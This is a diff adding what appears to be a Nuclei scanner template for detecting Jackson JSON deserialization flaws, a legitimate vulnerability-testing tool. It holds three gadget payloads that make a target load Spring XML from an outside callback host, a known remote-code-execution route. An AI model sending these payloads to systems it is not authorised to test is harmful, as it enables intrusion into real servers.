@@ -1,0 +1,34 @@
+id: jackson-json-deserialization
+
+info:
+  name: Jackson JSON Deserialization Attack
+  author: reewardius
+  reference: NotSoSecure Web Hacking - Part2
+  severity: critical
+  tags: fuzzing-rce,fuzzing-req,dast
+  
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+      
+    payloads:
+      jackson:
+      - "com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext('http://{{interactsh-url}}')"
+      - '["org.springframework.context.support.FileSystemXmlApplicationContext", "http://{{interactsh-url}}/spel.xml"]'
+      - 'org.springframework.context.support.FileSystemXmlApplicationContext", "http://{{interactsh-url}}/spel.xml"'
+      
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{jackson}}"
+          
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
